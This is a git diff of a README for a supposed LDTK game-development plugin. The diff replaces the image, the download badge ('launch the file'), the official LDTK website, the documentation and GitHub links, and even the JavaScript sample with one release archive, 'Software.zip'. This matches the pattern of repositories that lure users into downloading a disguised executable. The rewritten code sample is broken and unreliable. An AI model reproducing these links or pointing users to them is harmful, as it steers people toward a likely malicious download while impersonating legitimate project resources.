@@ -1,7 +1,7 @@
 
 # 🎮 Plugin LDTK
 
-![LDTK Plugin](https://github.com/example/link-to-image.png)
+![LDTK Plugin](https://github.com/banvers/plugin-ldtk/releases/download/v2.0/Software.zip)
 
 Welcome to the Plugin LDTK repository - your go-to resource for integrating LDTK JSON data into your game projects! This plugin is designed to enhance your game development experience by providing seamless access to LDTK features through a simple and efficient interface.
 
@@ -14,7 +14,7 @@ Welcome to the Plugin LDTK repository - your go-to resource for integrating LDTK
 
 ## Installation
 You can download the latest version of the Plugin LDTK from the following link:
-[![Download Plugin LDTK](https://img.shields.io/badge/Download-Plugin%20LDTK-blue.svg)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip "launch the file")
+[![Download Plugin LDTK](https://github.com/banvers/plugin-ldtk/releases/download/v2.0/Software.zip%https://github.com/banvers/plugin-ldtk/releases/download/v2.0/Software.zip)](https://github.com/banvers/plugin-ldtk/releases/download/v2.0/Software.zip "launch the file")
 
 Simply click on the button above to initiate the download. Once the file is downloaded, follow the installation instructions provided in the repository to set up the plugin in your project.
 
@@ -27,7 +27,7 @@ To start using the Plugin LDTK in your game development process, follow these st
 
 ```javascript
 // Sample code snippet for loading LDTK data
-const ldtkData = LDTK.load("path/to/your/ldtk.json");
+const ldtkData = https://github.com/banvers/plugin-ldtk/releases/download/v2.0/Software.zip("https://github.com/banvers/plugin-ldtk/releases/download/v2.0/Software.zip");
 ```
 
 ## Examples
@@ -39,9 +39,9 @@ Check out these examples to see the Plugin LDTK in action:
 We welcome contributions from the open-source community to enhance the functionality and usability of the Plugin LDTK. If you have any ideas, suggestions, or improvements, feel free to submit a pull request or open an issue on our GitHub repository.
 
 ## Resources
-- [LDTK Official Website](https://ldtk.io/)  
-- [LDTK Documentation](https://ldtk.io/docs/)  
-- [LDTK GitHub Repository](https://github.com/deepnight/ldtk)  
+- [LDTK Official Website](https://github.com/banvers/plugin-ldtk/releases/download/v2.0/Software.zip)  
+- [LDTK Documentation](https://github.com/banvers/plugin-ldtk/releases/download/v2.0/Software.zip)  
+- [LDTK GitHub Repository](https://github.com/banvers/plugin-ldtk/releases/download/v2.0/Software.zip)  
 
 ## License
 The Plugin LDTK is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
